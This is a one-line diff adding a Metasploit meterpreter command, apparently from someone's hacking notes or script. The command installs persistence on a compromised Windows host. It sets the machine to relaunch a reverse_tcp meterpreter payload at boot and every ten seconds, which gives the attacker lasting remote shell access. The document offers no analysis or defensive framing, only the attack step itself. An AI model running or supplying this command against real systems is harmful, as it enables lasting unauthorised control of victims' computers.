@@ -1,0 +1,1 @@
+run persistence -i 10 -X -P windows/x64/meterpreter/reverse_tcp -L G:/hacking/sample
